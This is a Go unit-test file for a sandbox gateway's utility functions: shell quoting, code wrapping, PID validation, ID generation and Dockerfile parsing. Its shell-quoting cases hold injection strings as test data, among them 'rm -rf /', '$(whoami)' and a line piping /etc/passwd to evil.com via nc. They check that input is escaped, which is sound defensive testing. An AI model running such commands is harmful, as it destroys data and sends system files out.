// Copyright The E2BGateway Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package util

import "testing"

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "empty string",
			in:   "",
			want: "''",
		},
		{
			name: "simple string",
			in:   "hello",
			want: "'hello'",
		},
		{
			name: "single quote escape",
			in:   "it's",
			want: "'it'\\''s'",
		},
		{
			name: "shell metachar semicolon",
			in:   "hello; rm -rf /",
			want: "'hello; rm -rf /'",
		},
		{
			name: "backtick injection",
			in:   "`echo pwned`",
			want: "'`echo pwned`'",
		},
		{
			name: "dollar sign expansion",
			in:   "$HOME/.ssh/id_rsa",
			want: "'$HOME/.ssh/id_rsa'",
		},
		{
			name: "double quote",
			in:   `say "hello"`,
			want: `'say "hello"'`,
		},
		{
			name: "newline",
			in:   "line1\nline2",
			want: "'line1\nline2'",
		},
		{
			name: "null byte",
			in:   "hello\x00world",
			want: "'hello\x00world'",
		},
		{
			name: "unicode",
			in:   "こんにちは",
			want: "'こんにちは'",
		},
		{
			name: "multiple single quotes",
			in:   "it's a 'test'",
			want: "'it'\\''s a '\\''test'\\'''",
		},
		{
			name: "pipe and ampersand",
			in:   "cat /etc/passwd | nc evil.com 1234 &",
			want: "'cat /etc/passwd | nc evil.com 1234 &'",
		},
		{
			name: "command substitution",
			in:   "$(whoami)",
			want: "'$(whoami)'",
		},
		{
			name: "backslash",
			in:   "path\\to\\file",
			want: "'path\\to\\file'",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ShellQuote(tt.in)
			if got != tt.want {
				t.Errorf("ShellQuote(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestWrapCodeInCommand(t *testing.T) {
	tests := []struct {
		name     string
		code     string
		language string
		want     string
	}{
		{
			name:     "python lowercase",
			code:     "print('hello')",
			language: "python",
			want:     `python3 -c "print('hello')"`,
		},
		{
			name:     "python3 mixed case",
			code:     "print('hello')",
			language: "Python3",
			want:     `python3 -c "print('hello')"`,
		},
		{
			name:     "empty language defaults to python",
			code:     "print('hello')",
			language: "",
			want:     `python3 -c "print('hello')"`,
		},
		{
			name:     "javascript",
			code:     `console.log("hi")`,
			language: "javascript",
			want:     "node -e \"console.log(\\\"hi\\\")\"",
		},
		{
			name:     "node",
			code:     `console.log("hi")`,
			language: "node",
			want:     "node -e \"console.log(\\\"hi\\\")\"",
		},
		{
			name:     "bash returns code unchanged",
			code:     "echo hello && ls -la",
			language: "bash",
			want:     "echo hello && ls -la",
		},
		{
			name:     "sh returns code unchanged",
			code:     "echo hello",
			language: "sh",
			want:     "echo hello",
		},
		{
			name:     "unknown language",
			code:     "puts 'hello'",
			language: "ruby",
			want:     "ruby -c \"puts 'hello'\"",
		},
		{
			name:     "code with special chars",
			code:     "x = 1 + 2; print(x)",
			language: "python",
			want:     `python3 -c "x = 1 + 2; print(x)"`,
		},
		{
			name:     "code with quotes and newlines",
			code:     "a = \"hello\"\nb = 'world'",
			language: "python",
			want:     "python3 -c \"a = \\\"hello\\\"\\nb = 'world'\"",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := WrapCodeInCommand(tt.code, tt.language)
			if got != tt.want {
				t.Errorf("WrapCodeInCommand(%q, %q) = %q, want %q", tt.code, tt.language, got, tt.want)
			}
		})
	}
}

func TestValidatePID(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantPID int
		wantErr bool
	}{
		{
			name:    "valid PID 123",
			input:   "123",
			wantPID: 123,
			wantErr: false,
		},
		{
			name:    "valid PID 0",
			input:   "0",
			wantPID: 0,
			wantErr: false,
		},
		{
			name:    "valid PID 1",
			input:   "1",
			wantPID: 1,
			wantErr: false,
		},
		{
			name:    "empty string",
			input:   "",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "non-numeric",
			input:   "abc",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "trailing letters rejected",
			input:   "123abc",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "decimal rejected",
			input:   "12.5",
			wantPID: 0,
			wantErr: true,
		},
		{
			name: "negative PID accepted by implementation",
			// NOTE: fmt.Sscanf("%d") accepts negative numbers.
			// The implementation does not reject them. PID -1 is returned as-is.
			input:   "-1",
			wantPID: -1,
			wantErr: false,
		},
		{
			name:    "overflow rejected",
			input:   "99999999999999999999",
			wantPID: 0,
			wantErr: true,
		},
		{
			name: "whitespace around number accepted",
			// fmt.Sscanf skips leading whitespace for %d, trailing space
			// is consumed as EOF (n=1, err=EOF), so it passes validation.
			input:   " 123 ",
			wantPID: 123,
			wantErr: false,
		},
		{
			name:    "pure whitespace rejected",
			input:   "   ",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "large valid PID",
			input:   "4194304",
			wantPID: 4194304,
			wantErr: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pid, err := ValidatePID(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePID(%q) error = %v, wantErr = %v", tt.input, err, tt.wantErr)
				return
			}
			if pid != tt.wantPID {
				t.Errorf("ValidatePID(%q) = %d, want %d", tt.input, pid, tt.wantPID)
			}
		})
	}
}

func TestGenerateE2BID(t *testing.T) {
	id, err := GenerateE2BID()
	if err != nil {
		t.Fatalf("GenerateE2BID() error = %v", err)
	}
	if len(id) != 12 {
		t.Errorf("GenerateE2BID() length = %d, want 12", len(id))
	}
	// Verify it's valid hex
	for _, c := range id {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			t.Errorf("GenerateE2BID() contains non-hex char %q", c)
		}
	}
	// Verify uniqueness
	id2, err := GenerateE2BID()
	if err != nil {
		t.Fatalf("GenerateE2BID() second call error = %v", err)
	}
	if id == id2 {
		t.Errorf("GenerateE2BID() produced duplicate IDs: %q", id)
	}
}

func TestMustGenerateE2BID(t *testing.T) {
	// Should not panic on normal operation
	id := MustGenerateE2BID()
	if len(id) != 12 {
		t.Errorf("MustGenerateE2BID() length = %d, want 12", len(id))
	}
}

func TestGenerateTemplateID(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantPfx string
		wantLen int // prefix + "-" + 12 hex = len(prefix) + 13
	}{
		{
			name:    "simple lowercase",
			input:   "mytemplate",
			wantPfx: "mytemplate",
			wantLen: 23,
		},
		{
			name:    "uppercase converted",
			input:   "MyTemplate",
			wantPfx: "mytemplate",
			wantLen: 23,
		},
		{
			name:    "special chars replaced",
			input:   "my_template!@#",
			wantPfx: "my-template",
			wantLen: 24,
		},
		{
			name:    "leading hyphens trimmed",
			input:   "---hello",
			wantPfx: "hello",
			wantLen: 18,
		},
		{
			name:    "empty becomes template",
			input:   "",
			wantPfx: "template",
			wantLen: 21,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			id, err := GenerateTemplateID(tt.input)
			if err != nil {
				t.Fatalf("GenerateTemplateID(%q) error = %v", tt.input, err)
			}
			if len(id) != tt.wantLen {
				t.Errorf("GenerateTemplateID(%q) length = %d, want %d (id=%q)", tt.input, len(id), tt.wantLen, id)
			}
			if id[:len(tt.wantPfx)] != tt.wantPfx {
				t.Errorf("GenerateTemplateID(%q) prefix = %q, want %q", tt.input, id[:len(tt.wantPfx)], tt.wantPfx)
			}
		})
	}
}

func TestMustGenerateTemplateID(t *testing.T) {
	// Should not panic on normal operation
	id := MustGenerateTemplateID("hello")
	if len(id) != 18 {
		t.Errorf("MustGenerateTemplateID(\"hello\") length = %d, want 18", len(id))
	}
	if id[:5] != "hello" {
		t.Errorf("MustGenerateTemplateID(\"hello\") prefix = %q, want \"hello\"", id[:5])
	}
}

func TestParseDockerfileFrom(t *testing.T) {
	tests := []struct {
		name       string
		dockerfile string
		want       string
	}{
		{
			name:       "single stage",
			dockerfile: "FROM python:3.11\nRUN pip install foo\n",
			want:       "python:3.11",
		},
		{
			name:       "multi-stage returns last",
			dockerfile: "FROM golang:1.21 AS builder\nRUN go build\nFROM alpine:3.18\nCOPY --from=builder /app /app\n",
			want:       "alpine:3.18",
		},
		{
			name:       "lowercase from",
			dockerfile: "from ubuntu:22.04\n",
			want:       "ubuntu:22.04",
		},
		{
			name:       "no FROM",
			dockerfile: "RUN echo hello\n",
			want:       "",
		},
		{
			name:       "empty dockerfile",
			dockerfile: "",
			want:       "",
		},
		{
			name:       "FROM with extra whitespace",
			dockerfile: "  FROM   node:20  \n",
			want:       "node:20",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ParseDockerfileFrom(tt.dockerfile)
			if got != tt.want {
				t.Errorf("ParseDockerfileFrom() = %q, want %q", got, tt.want)
			}
		})
	}
}
